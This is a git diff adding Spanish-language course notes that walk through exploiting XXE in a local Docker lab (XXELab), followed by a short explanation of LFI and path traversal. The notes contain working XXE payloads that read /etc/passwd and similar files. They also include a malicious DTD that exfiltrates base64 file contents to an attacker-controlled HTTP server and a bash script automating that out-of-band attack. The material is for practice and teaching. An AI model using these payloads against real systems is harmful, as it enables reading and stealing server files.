@@ -2810,3 +2810,278 @@ Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a serv
 A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad.
 
 [XXELab](https://github.com/jbarone/xxelab)
+
+```bash
+mkdir carpeta
+
+git clone https://github.com/jbarone/xxelab
+
+cd XXE/xxelab
+
+docker volume ls
+docker ps
+docker ps -a
+docker image
+
+docker build -t xxelab .
+docker run -dit --rm -p 127.0.0.1:5000:80 xxelab
+docker ps
+
+localhost:5000
+
+# Abrimos burpsuite para interceptar la peticion
+# Rellenamos el formulario y aceptamos los terminos
+# Estando en burpsuite vemos los campos xml en el repeater
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            savitar
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Al campo email lo editamos y ponemos gerardo, vemos que el response  nos cambia por gerardo 
+
+# Añadimos la entidad al request y vemos que el response nos interpreta el nombre
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY myName "s4vitar">]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            &myName;
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+
+# Apuntamos a un archivo interno de la maquina
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            &myFile;
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Otra forma de ver lo mismo pero en base64
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            &myFile;
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Inyectamos IP
+sudo su
+python3 http.server 80
+
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://miIP/testXXE">]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            &myFile;
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Cuando no nos deja cargar el XXE desde la estructura del xml, la cargamos en el DOCTYPE
+sudo su
+python3 http.server 80
+
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://miIP/testXXE"> %myFile;]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            test@test.com
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+
+
+# Inyección a ciegas OOB BLIND ----------------------------
+sudo su
+python3 http.server 80
+
+# Creamos archivo malicious.dtd
+nvim malicious.dtd
+# +++++++ malicious.dtd inicio
+# La representacion del simbolo "%" en hexadecimal = 25, pero para la entity es = &#x25;
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://miIp/?file=%file;' >">
+%eval;
+%exfil;
+
+# +++++++ malicious.dtd fin
+
+# En el burpsuite cargamos de nuevo
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://miIP/malicious.dtd"> %xxe;]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            test@test.com
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Revisamos el output que nos mandó a la consola con base 64
+
+echo -n "salida recibida en http.server" | base64 -d; echo
+
+
+
+
+
+# Inyección a ciegas OOB BLIND ----------------------------
+sudo su
+python3 http.server 80
+
+# Creamos archivo malicious.dtd
+nvim malicious.dtd
+# +++++++ malicious.dtd inicio
+# La representacion del simbolo "%" en hexadecimal = 25, pero para la entity es = &#x25;
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://miIp/?file=%file;' >">
+%eval;
+%exfil;
+
+# +++++++ malicious.dtd fin
+
+# En el burpsuite cargamos de nuevo
+<?xml version ="1.0" encoding="UTF-8"?>
+    <root>
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://miIP/malicious.dtd"> %xxe;]>
+        <name>
+            test
+        </name>
+        <tel>
+            123456789
+        </tel>
+        <email>
+            test@test.com
+        </email>
+        <password>
+            savitar123
+        </password>
+    </root>
+
+# Revisamos el output que nos mandó a la consola con base 64
+
+echo -n "salida recibida en http.server" | base64 -d; echo
+
+
+
+
+# SCRIPT SH ----------------------------
+nvim xxe_oob.sh
+# xxe_oob.sh Inicio +++++
+#!/usr/bin/bash
+echo -ne "\n[+] Introduce el archivo a leer: " &&  read -r myFilename
+
+malicious_dtd="""
+<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=%myFilename\">
+<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://miIp/?file=%file;' >\">
+%eval;
+%exfil; """
+
+echo $malicious_dtd > malicious.dtd
+
+python3 http.server 80 &>response &
+
+PID=$!
+
+sleep 1; echo
+
+curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version"1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://miIP/malicious.dtd"> %xxe;]>
+<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>' &>/dev/null
+
+cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
+
+kill -9 $PID
+wait $PID 2>/dev/null
+
+rm response 2>/dev/null
+
+# xxe_oob.sh Fin +++++
+
+chmod +x xxe_oob.sh
+./xxe_oob.sh
+
+```
+
+### Local File Inclusion (LFI)
+
+La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.
+
+En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como "**Path Traversal**" y se utiliza comúnmente en ataques de LFI.
+
+En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.
+
+Por ejemplo, el atacante podría incluir "**../**" en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.
+
+Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresa deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.
+
+A continuación, se proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los '**Filter Chains**' y conseguir así ejecución remota de comandos:
+
+[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
